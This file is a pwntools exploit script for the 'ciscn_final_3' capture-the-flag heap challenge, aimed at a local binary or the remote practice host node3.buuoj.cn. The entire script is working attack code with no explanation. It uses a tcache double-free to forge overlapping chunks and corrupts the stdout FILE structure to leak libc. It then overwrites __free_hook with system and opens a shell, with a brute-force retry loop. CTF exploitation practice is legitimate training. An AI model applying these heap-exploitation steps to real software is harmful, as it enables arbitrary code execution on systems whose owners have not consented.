import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try:
		if len(sys.argv)==1 :
			io=process(['./ciscn_final_3'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./ciscn_final_3')
			libc=ELF('./libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28558)
			elf=ELF('./ciscn_final_3')
			libc=ELF('libc.so.6')


		def add(a,b,c):
			io.sendlineafter('choice > ','1')
			io.sendlineafter('input the index\n',str(a))
			io.sendlineafter('input the size\n',str(b))
			io.sendafter('now you can write something\n',c)

		def delete(a):
			io.sendlineafter('choice > ','2')
			io.sendlineafter('input the index\n',str(a))

		add(0,0x78,'\x00'*0x60+p64(0)+p64(0x81))
		io.recvuntil('gift :0x')
		heap_chunk_1=int(io.recv(12),16)+0x70
		add(6,0x38,'a')
		add(7,0x28,'a')
		add(8,0x38,'a')
		add(9,0x38,'a')
		add(0x18,0x78,'a')
		add(0x17,0x78,'a')
		add(0x16,0x78,'a')
		add(0x15,0x78,'a')
		add(0x14,0x78,'a')
		add(0x13,0x78,'a')
		add(0x12,0x78,'/bin/sh\x00')
		add(0x11,0x78,'a')
		add(0x10,0x78,'a')
		delete(0)
		delete(0)
		add(1,0x78,p64(heap_chunk_1))
		add(2,0x78,p64(heap_chunk_1))
		add(3,0x78,p64(0)+p64(0x4f1)+'\x00'*0x38+p64(0x71))
		delete(6)
		delete(7)
		add(4,0x38,'a')
		delete(3)
		add(5,0x78,p64(0)+p64(0x41)+'\x00'*0x38+p64(0x71)+'\x60\x57')
		add(10,0x68,'aaaa')
		add(11,0x68,p64(0xfbad1800)+p64(0)*3+'\xc8')
		libc.address=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		success('libc.address:'+hex(libc.address))
		delete(8)
		delete(8)
		add(12,0x38,p64(libc.sym['__free_hook']))
		add(13,0x38,p64(libc.sym['__free_hook']))
		add(14,0x38,p64(libc.sym['system']))
		success('libc.address:'+hex(libc.address))
		#gdb.attach(io)
		pause()
		io.interactive()

	except Exception as e:
		io.close()
	else:
		continue